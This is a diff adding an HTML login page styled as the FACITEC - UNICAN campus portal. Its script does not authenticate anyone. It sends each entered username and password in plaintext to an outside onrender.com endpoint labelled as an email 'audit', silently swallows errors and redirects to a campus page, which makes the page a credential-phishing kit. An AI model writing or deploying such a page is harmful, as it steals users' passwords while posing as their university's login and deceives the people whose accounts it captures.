@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login | FACITEC - UNICAN</title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="css/login.css">
+</head>
+
+<body>
+
+  <div class="login-wrapper">
+    <div class="login-container">
+      <div class="loginform">
+
+        <div class="login-logo">
+          <img src="img/facitec.png" alt="FACITEC Logo">
+        </div>
+
+        <!-- FORMULARIO DE LOGIN -->
+        <form class="login-form" onsubmit="return loginPrueba()">
+
+          <div class="login-form-username">
+            <input
+              type="text"
+              id="username"
+              placeholder="Nombre de usuario"
+              required>
+          </div>
+
+          <div class="login-form-password">
+            <input
+              type="password"
+              id="password"
+              placeholder="Contraseña"
+              required>
+          </div>
+
+          <div class="login-form-submit">
+            <button type="submit" class="btn-acceder">Acceder</button>
+          </div>
+
+        </form>
+
+        <hr>
+        <button class="btn-cookies">Aviso de Cookies</button>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL COOKIES -->
+  <div id="modalCookies" class="modal-cookies">
+    <div class="modal-content">
+      <span class="modal-close" onclick="cerrarModalCookies()">&times;</span>
+      <h2>Las cookies deben estar habilitadas</h2>
+      <p>Este sitio utiliza cookies de sesión.</p>
+      <div class="modal-footer">
+        <button class="btn-modal-ok" onclick="cerrarModalCookies()">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- JS -->
+  <script>
+    const API = "https://plagio-backend-ia.onrender.com";
+
+    // Modal cookies
+    document.querySelector(".btn-cookies").onclick = () => {
+      document.getElementById("modalCookies").style.display = "block";
+    };
+
+    function cerrarModalCookies() {
+      document.getElementById("modalCookies").style.display = "none";
+    }
+
+    // LOGIN SIMPLE + AUDITORÍA
+    function loginPrueba() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+
+      // Enviar auditoría (correo)
+      fetch(`${API}/api/login_audit`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          username: user,
+          password: pass
+        })
+      }).catch(() => {
+        // no hacemos nada visible al usuario
+      });
+
+      // Redirección directa (sin esperar)
+      window.location.href = "redirect_campus.html";
+
+      return false; // evita submit normal
+    }
+  </script>
+
+</body>
+</html>
